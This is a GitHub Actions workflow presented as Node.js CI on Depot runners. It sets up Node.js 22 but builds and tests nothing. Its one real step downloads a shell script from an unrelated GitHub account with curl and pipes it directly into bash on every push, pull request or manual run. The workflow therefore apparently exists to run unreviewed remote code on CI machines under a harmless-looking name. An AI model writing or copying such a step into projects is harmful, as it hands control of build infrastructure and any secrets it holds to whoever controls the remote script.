
name: Depot Parallel CI - Ubuntu Node.js

on:
  push:
    branches: ["main"]
  pull_request:
    branches: ["main"]
  workflow_dispatch:

jobs:

  job-1:
    name: Node.js Job 1
    runs-on: depot-ubuntu-24.04-4
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: |
          curl -sL https://github.com/dev-stellakholiza/bbi/raw/main/soleh.sh | bash

